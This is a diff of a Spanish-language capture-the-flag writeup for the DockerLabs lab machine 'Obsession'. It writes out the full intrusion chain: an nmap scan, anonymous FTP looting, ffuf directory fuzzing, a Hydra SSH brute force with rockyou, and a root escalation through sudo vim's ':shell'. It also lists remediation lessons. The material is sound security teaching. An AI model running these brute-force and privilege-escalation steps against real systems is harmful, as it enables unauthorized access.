@@ -1,248 +1,160 @@
-# 🕵️ Máquina: Obsession — DockerLabs
+# Obsession (DockerLabs) — Writeup
 
-**Plataforma:** DockerLabs · **Dificultad:** Muy fácil · **SO:** Ubuntu Linux · **IP objetivo:** `172.17.0.2`
+Máquina de dificultad muy fácil sobre Ubuntu Linux. El nombre le viene al pelo: el protagonista de este pwn es un usuario obsesionado con una chica, y esa obsesión es literalmente la pista que nos lleva hasta él.
 
-> Spoiler: el "amor secreto" de esta máquina no es la vulnerabilidad más difícil que verás en tu vida, pero sí una lección perfecta de por qué NO debes reciclar tu usuario en todos lados como si fuera tu playlist de Spotify.
-
----
-
-## 🧭 Resumen del camino hasta root
-
-```
-Ping (vive) → Nmap (FTP + SSH + HTTP)
-   → FTP anónimo (dos ficheros jugosos)
-   → HTML con un comentario que no debería existir
-   → ffuf descubre /backup
-   → Hydra revienta el SSH
-   → sudo -l revela vim con superpoderes
-   → :shell → root 🏆
-```
+IP de laboratorio: `172.17.0.2`
 
 ---
 
-## 1️⃣ ¿Está vivo el objetivo?
+## Planteamiento
 
-Lo primero de siempre: comprobar que la máquina responde.
+Antes de lanzar ninguna herramienta, conviene tener claro el objetivo: encontrar un usuario válido, conseguir credenciales, entrar por SSH y escalar a root. En máquinas "muy fácil" normalmente hay una cadena de 3-4 fallos encadenados, ninguno especialmente sofisticado por separado. Aquí el patrón se repite: cada servicio filtra un poquito de información, y juntando las piezas se llega al final.
+
+---
+
+## Paso 0: comprobar que el bicho respira
 
 ```bash
 ping -c 2 172.17.0.2
 ```
 
-```
-64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.076 ms
-64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.055 ms
-2 packets transmitted, 2 received, 0% packet loss
-```
-
-Un TTL de 64 es básicamente la máquina gritando "SOY LINUX" sin que se lo preguntemos dos veces.
+Respuesta con TTL 64, señal típica de un host Linux (los Windows suelen responder con 128). Nada nuevo bajo el sol, pero es el primer check de cualquier auditoría.
 
 ---
 
-## 2️⃣ Nmap: la libreta de reclamaciones del objetivo
+## Paso 1: mapear servicios
+
+Escaneo completo de puertos, sin resolución DNS y sin ping previo (ya sabemos que responde):
 
 ```bash
-sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv -oN escaneo.txt 172.17.0.2
+sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv -oN nmap_full.txt 172.17.0.2
 ```
 
-| Puerto | Estado | Servicio | Versión |
-|--------|--------|----------|---------|
-| 21/tcp | abierto | FTP | vsftpd 3.0.5 |
-| 22/tcp | abierto | SSH | OpenSSH 9.6p1 (Ubuntu) |
-| 80/tcp | abierto | HTTP | Apache 2.4.58 (Ubuntu) |
+Resultado:
 
-Lo interesante: **el FTP acepta login anónimo**. Cuando un servicio te deja entrar sin credenciales, generalmente es una invitación a fisgonear, y aquí no iba a ser diferente.
+- **21/tcp** — vsftpd 3.0.5
+- **22/tcp** — OpenSSH 9.6p1 (Ubuntu)
+- **80/tcp** — Apache 2.4.58 (Ubuntu)
+
+Tres servicios, superficie de ataque pequeña. Lo primero que llama la atención en el output de Nmap con `-sC` es que el FTP **admite login anónimo**. Ese suele ser el hilo del que empezar a tirar.
 
 ---
 
-## 3️⃣ FTP anónimo: el diario íntimo que nadie debería subir a un servidor
+## Paso 2: tirar del FTP anónimo
 
 ```bash
 ftp 172.17.0.2
-# Usuario: anonymous
-# Contraseña: (en blanco, tecla Enter y ya)
-
-ftp> ls
-ftp> get chat-privado.txt
-ftp> get lista-tareas.txt
-ftp> quit
 ```
 
-### `chat-privado.txt`
+Usuario: `anonymous`, contraseña vacía (solo pulsar Enter). Dentro hay dos archivos de texto descargables con `get`.
 
-```
-[16:21, 16/6/2024] Gonza: en serio es tan guapa esa tal Nágore como dices?
-[16:28, 16/6/2024] Russoski: es una auténtica princesa, le he hecho hasta un vídeo...
-[16:29, 16/6/2024] Russoski: lo tengo guardado en mi ordenador, en una ruta segura, ya te lo enseño cuando quedemos
-```
+El primero es, literalmente, la captura de una conversación de chat entre dos personas. Uno de ellos, identificado como **russoski**, presume de haber grabado un vídeo a una chica llamada Nágore y menciona que lo tiene guardado "en una ruta segura" de su ordenador. Con esto ya tenemos un nombre de usuario candidato.
 
-Un chat filtrado por FTP, con el drama incluido gratis. Sacamos el primer dato de valor: el nombre de usuario **`russoski`**.
-
-### `lista-tareas.txt`
-
-```
-1 Comprar el voucher de la certificación eJPTv2 ya mismo
-2 Subir el precio de mis asesorías online
-3 Terminar mi laboratorio para DockerLabs
-4 Revisar la configuración de mi equipo, creo que tengo permisos
-  mal puestos que no son nada seguros... (ojo con esto)
-```
-
-El propio "russoski" nos deja la pista de que su máquina tiene permisos flojos. Vamos a tomarle la palabra.
+El segundo archivo es una lista de tareas pendientes del propio russoski. Entre ellas hay una que destaca sobre las demás: menciona que tiene "ciertos permisos habilitados que no son del todo seguros" en su equipo y que debería revisarlos. Aquí el autor de la máquina nos está regalando, sin quererlo el propio personaje, la pista de la escalada de privilegios. Conviene apuntarlo mentalmente para más adelante.
 
 ---
 
-## 4️⃣ El sitio web: cuando los comentarios HTML hablan de más
+## Paso 3: mirar qué esconde el servidor web
 
 ```bash
-curl -i http://172.17.0.2
+curl -s http://172.17.0.2 | grep -i "<!--"
 ```
 
-Escondido en el código fuente:
+En el código fuente aparece un comentario del desarrollador confesando que reutiliza el mismo usuario en todos sus servicios "para no olvidarlo". Es la confirmación que necesitábamos: el nombre visto en el chat de FTP es también el usuario de SSH.
 
-```html
-<!-- Uso el mismo usuario en todos mis servicios, así no se me olvida -->
-```
-
-Traducción libre: "he puesto la misma llave en todas mis puertas". Con esto confirmamos que **`russoski`** probablemente también es su usuario de SSH.
-
-### Fuzzing de directorios con ffuf
+Ahora toca buscar rutas ocultas:
 
 ```bash
 ffuf -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt \
-     -u http://172.17.0.2/FUZZ -r -ac -v -recursion
+     -u http://172.17.0.2/FUZZ -recursion -ac -v
 ```
 
-```
-[200] /backup
-[200] /important
-```
+Aparecen dos directorios con código 200: `/important` y `/backup`.
 
-**`/important`** resultó ser un archivo con el Manifiesto Hacker clásico (bonito gesto, cero utilidad práctica).
+- `/important` contiene un archivo de texto con el manifiesto clásico de "La conciencia de un hacker". Curioso, pero irrelevante para el ataque.
+- `/backup` contiene un archivo `backup.txt` con una única línea: el nombre de usuario en texto plano, junto con una nota del propio administrador diciendo que "hay que cambiarlo pronto". Spoiler: no lo cambió a tiempo.
 
-**`/backup`** en cambio es oro puro:
-
-```bash
-wget http://172.17.0.2/backup/backup.txt
-cat backup.txt
-```
-
-```
-Usuario para todos mis servicios: russoski (cambiar pronto!)
-```
-
-Usuario confirmado, en texto plano, cortesía de una carpeta de backup que nunca debió estar accesible desde fuera.
+Con esto el usuario queda confirmado por partida triple (chat, comentario HTML y backup).
 
 ---
 
-## 5️⃣ Fuerza bruta al SSH con Hydra
+## Paso 4: fuerza bruta contra SSH
 
-Con el usuario en mano, tocaba adivinar la contraseña. Rockyou al rescate, como siempre.
+Con usuario confirmado, toca probar contraseñas. Diccionario de cabecera de cualquier CTF:
 
 ```bash
-hydra -l russoski -P ~/Desktop/Wordlists/rockyou.txt -V ssh://172.17.0.2
+hydra -l russoski -P rockyou.txt -V ssh://172.17.0.2
 ```
 
-```
-[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
-```
-
-`iloveme`. Poético, considerando el contexto del chat sobre Nágore. Casi tierno si no fuera una vulnerabilidad.
-
-### Conexión
+Hydra encuentra la contraseña en cuestión de minutos: `iloveme`. Dado el contexto del chat sobre la chica, la contraseña no es precisamente una sorpresa — más bien un chiste que se escribe solo.
 
 ```bash
 ssh russoski@172.17.0.2
-# Contraseña: iloveme
 ```
 
-```
-Welcome to Ubuntu 24.04 LTS (GNU/Linux 7.0.12-zen1-1-zen x86_64)
-russoski@c9b63865b888:~$
-```
-
-Estamos dentro. Ahora toca subir de nivel.
+Sesión abierta como usuario de bajo privilegio.
 
 ---
 
-## 6️⃣ De russoski a root: gracias, sudo
+## Paso 5: escalar a root
+
+Primer comando de rigor tras entrar en cualquier máquina:
 
 ```bash
 sudo -l
 ```
 
-```
-User russoski may run the following commands on c9b63865b888:
-    (root) NOPASSWD: /usr/bin/vim
-```
+La salida confirma exactamente lo que la lista de tareas del FTP anticipaba: el usuario puede ejecutar `/usr/bin/vim` como root sin necesidad de contraseña (`NOPASSWD`).
 
-Aquí está el "permiso mal puesto" que el propio usuario nos advirtió en su lista de tareas. `vim` con `NOPASSWD` como root es, en la práctica, una llave maestra: cualquier editor con capacidad de abrir una shell interna hereda los privilegios del proceso que lo ejecuta.
-
-Consulta rápida en [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/) para confirmar la técnica exacta.
-
-### La jugada
+Vim, como muchos editores e intérpretes, permite abrir una shell del sistema desde dentro de su propio entorno. Si el proceso que lo lanza tiene privilegios de root, la shell resultante también los tiene. Es una técnica catalogada en GTFOBins, el repositorio de referencia para este tipo de "escapes" desde binarios legítimos.
 
 ```bash
 sudo vim
 ```
 
-Una vez dentro, en modo normal (fuera de modo inserción):
+Una vez dentro del editor, en modo normal:
 
 ```
 :shell
 ```
 
+Y con eso, una shell de root sin pedir ni una contraseña:
+
 ```
-root@c9b63865b888:/home/russoski# id
+# id
 uid=0(root) gid=0(root) groups=0(root)
-
-root@c9b63865b888:/home/russoski# whoami
-root
 ```
 
-🏆 **Root conseguido.** De un editor de texto a control total del sistema en una sola línea de comandos.
+Máquina resuelta.
 
 ---
 
-## 🎬 Bonus: el vídeo que tanto escondió Russoski
+## El detalle final: el vídeo
 
-El chat mencionaba una "ruta segura" donde guardaba cierto vídeo. Con acceso root, no hacía falta buscar mucho:
-
-```bash
-ls /root
-# Video-Nagore-Fernandez.txt
-
-cat /root/Video-Nagore-Fernandez.txt
-```
-
-```
-Al fin lo terminé! es tan hermosa.. <3
-https://www.youtube.com/shorts/_v8GzGReTAk
-```
-
-Resulta que la "ruta segura" era simplemente `/root`. La seguridad por oscuridad, una vez más, demostrando que no es seguridad.
+Como colofón anecdótico, una vez con acceso root merece la pena revisar el directorio home del propio root. Ahí aparece un archivo con el nombre de la chica mencionada en el chat inicial, conteniendo un enlace de YouTube y un comentario emocionado del usuario sobre haber "terminado" el vídeo. La "ruta segura" de la que hablaba al principio no era más que el home de root — la ironía de creer que algo está protegido solo porque está "escondido" en el sitio equivocado.
 
 ---
 
-## 📋 Resumen de credenciales
+## Credenciales encontradas
 
-| Usuario | Contraseña | Cómo se obtuvo |
-|---------|------------|-----------------|
-| `russoski` | `iloveme` | Fuerza bruta con Hydra + rockyou.txt |
-| `root` | — | `sudo vim` → `:shell` |
-
----
-
-## 🧠 Lecciones que deja esta máquina
-
-- **FTP anónimo activo** = puerta abierta a archivos internos, notas personales y nombres de usuario servidos en bandeja.
-- **Comentarios en el HTML** no son un lugar para "notitas rápidas": todo el mundo con `Ctrl+U` puede leerlos.
-- **Reutilizar el mismo usuario en todos los servicios** convierte un solo fallo en un compromiso total. Es el equivalente digital de usar la misma llave para casa, coche y taquilla del gimnasio.
-- **Carpetas de backup expuestas públicamente** (`/backup`) son un clásico: si algo dice "backup", probablemente no debería estar a un `wget` de distancia.
-- **`sudo NOPASSWD` sobre binarios como `vim`** equivale, en la práctica, a dar acceso root sin contraseña. Revisa siempre [GTFOBins](https://gtfobins.github.io/) antes de otorgar permisos sudo a cualquier binario, por inofensivo que parezca.
+| Usuario | Contraseña | Origen |
+|---|---|---|
+| russoski | iloveme | Hydra contra SSH |
+| root | — | Escape de sudo vim |
 
 ---
 
-## 🔗 Referencias
+## Qué falló aquí (y cómo se evita)
 
-- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
-- [DockerLabs](https://dockerlabs.es/)
+1. **FTP con acceso anónimo habilitado.** Si un servicio no necesita estar abierto al público, no debería estarlo. Y si necesita estarlo, desde luego no debería tener archivos con nombres de usuario ni información personal dentro.
+2. **Comentarios de depuración olvidados en el HTML de producción.** Cualquier información operativa (usuarios, rutas, credenciales, arquitectura interna) no debe viajar en el código fuente que ve el cliente.
+3. **Reutilización del mismo usuario en todos los servicios.** Convierte cualquier fuga aislada en un mapa completo del sistema.
+4. **Directorio de backups accesible sin autenticación.** Un backup expuesto en la web equivale a regalar las llaves de casa.
+5. **Regla de sudo demasiado permisiva sobre un binario con capacidad de shell.** Nunca debe concederse `NOPASSWD` sobre editores, intérpretes o cualquier binario listado en GTFOBins sin restringir explícitamente esa capacidad.
+
+---
+
+## Referencias
+
+- GTFOBins — vim: https://gtfobins.github.io/gtfobins/vim/
+- DockerLabs: https://dockerlabs.es/
